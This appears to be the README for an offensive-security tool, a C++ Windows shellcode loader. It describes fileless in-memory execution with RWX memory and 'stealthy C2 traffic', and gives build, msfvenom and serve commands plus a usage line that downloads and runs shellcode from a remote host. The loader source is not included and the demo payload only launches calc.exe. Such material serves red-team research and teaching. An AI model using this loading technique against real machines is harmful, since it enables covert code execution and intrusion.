A minimal C++ shellcode loader for Windows written for red team, malware research, and educational purposes.

## 🚀 Description

This tool demonstrates:
- Downloading remote shellcode via HTTP
- Allocating RWX memory with `VirtualAlloc`
- Executing shellcode directly from memory (fileless execution)
- Using the `wininet` API for stealthy C2 traffic

> 🔐 Educational use only. Unauthorized use of this code is illegal.


## 📂 Filename

**loader.cpp** – Console-based shellcode loader (C++)


## 📌 Technique

**In-memory shellcode execution over HTTP**

- **Download stage**: Retrieves shellcode from a remote URL
- **Memory stage**: Allocates executable memory (`PAGE_EXECUTE_READWRITE`)
- **Execution**: Transfers control to shellcode via a function pointer


## 🧱 Requirements

- `x86_64-w64-mingw32-g++` (MinGW-w64)
- Windows target


## ⚙️ Build

```bash
x86_64-w64-mingw32-g++ loader.cpp -o loader.exe -static -lwininet -s -Wl,-subsystem,console
```


## 🧪 Usage

```bash
loader.exe http://<ip_address>/shellcode.bin
```


## 🛠️ Example Shellcode Generation

```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o enc.bin
```

Serve with python:
```bash
python3 -m http.server 80
```

Then run
```bash
loader.exe http://127.0.0.1:30001/enc.bin
```
